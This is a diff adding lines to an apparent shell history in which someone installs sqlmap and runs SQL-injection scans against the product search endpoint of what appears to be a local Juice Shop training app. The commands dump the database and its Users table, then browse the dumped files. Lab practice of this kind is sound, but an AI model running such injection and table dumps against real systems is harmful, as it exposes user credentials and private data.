@@ -35,3 +35,22 @@ exit
 ls /root/output
 ls /root/
 exit
+apt update && apt install sqlmap -y
+sqlmap --version
+curl http://localhost:3000
+curl http://juice-shop:3000
+sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --batch --level=3 --risk=2 --random-agent
+sqlmap -u "http://juice-shop:3000/#/products/search?q=test" --batch --level=3 --risk=2 --random-agent
+sqlmap -u "http://juice-shop:3000/#/products/search?q=test" --batch --level=5 --risk=2 --random-agent
+sqlmap -u "http://juice-shop:3000/#/products/search?q=test*" --batch --level=5 --risk=2 --random-agent
+sqlmap -u "http://juice-shop:3000/#/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
+sqlmap -u "http://juice-shop:3000/#/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
+sqlmap -u "http://juice-shop:3000/rest/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
+cd /root/.local/share/sqlmap/output/juice-shop/dump/SQLite_masterdb/
+exit
+cd /root/.local/share/sqlmap/output/juice-shop/dump/SQLite_masterdb
+ls
+exit
+sqlmap -u "http://juice-shop:3000/rest/products/search?q=test"   -p q --dbms=sqlite --batch -T Users --dump
+]exit
+exit
